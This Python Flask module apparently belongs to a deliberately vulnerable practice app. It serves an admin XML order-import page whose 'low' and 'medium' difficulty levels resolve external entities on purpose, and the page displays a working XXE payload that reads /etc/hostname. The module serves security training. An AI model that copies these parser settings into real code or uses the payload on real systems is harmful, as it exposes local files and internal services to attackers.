import html as html_lib

from flask import Blueprint, request
from lxml import etree

from ..chrome import page
from ..difficulty import get_difficulty

bp = Blueprint("xxe", __name__)

SAMPLE_XML = """<?xml version="1.0"?>
<orders>
  <order><product_id>1</product_id><qty>2</qty></order>
</orders>"""

XXE_SAMPLE = """<?xml version="1.0"?>
<!DOCTYPE orders [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<orders>
  <order><product_id>&xxe;</product_id><qty>1</qty></order>
</orders>"""


@bp.route("/admin/import-orders", methods=["GET", "POST"])
def import_orders():
    if request.method == "GET":
        return page("Bulk order import", f"""
        <h1 class="page-title">Bulk order import (XML)</h1>
        <div class="card">
          <form class="stack" method="post" action="/admin/import-orders">
            <label>Paste order XML</label>
            <textarea name="xml" rows="8">{html_lib.escape(SAMPLE_XML)}</textarea>
            <button type="submit">Import</button>
          </form>
          <p class="hint">Bulk-imports orders exported from a supplier system as XML. Try the DOCTYPE/ENTITY payload below to read a local file:</p>
          <pre>{html_lib.escape(XXE_SAMPLE)}</pre>
        </div>
        """)

    xml_data = request.form.get("xml", "")
    diff = get_difficulty("xxe")

    try:
        if diff == "low":
            # XXE: DTDs and external entities are fully resolved, so a
            # crafted <!DOCTYPE> can read local files or trigger SSRF via
            # a SYSTEM identifier pointing at an internal URL.
            parser = etree.XMLParser(resolve_entities=True, no_network=False, dtd_validation=False)
            tree = etree.fromstring(xml_data.encode(), parser=parser)
        elif diff == "medium":
            # entities are still resolved, but only local files (network
            # SSRF-via-XXE is blocked) -- still a full local file read.
            parser = etree.XMLParser(resolve_entities=True, no_network=True, dtd_validation=False)
            tree = etree.fromstring(xml_data.encode(), parser=parser)
        else:
            # hard: DTDs disabled entirely
            parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
            tree = etree.fromstring(xml_data.encode(), parser=parser)

        rendered = etree.tostring(tree, pretty_print=True).decode()
        body = f'<h1 class="page-title">Import result</h1><div class="card"><pre>{html_lib.escape(rendered)}</pre></div>'
    except Exception as e:
        body = f'<div class="alert err">Import failed: {html_lib.escape(str(e))}</div>'

    return page("Import result", body)
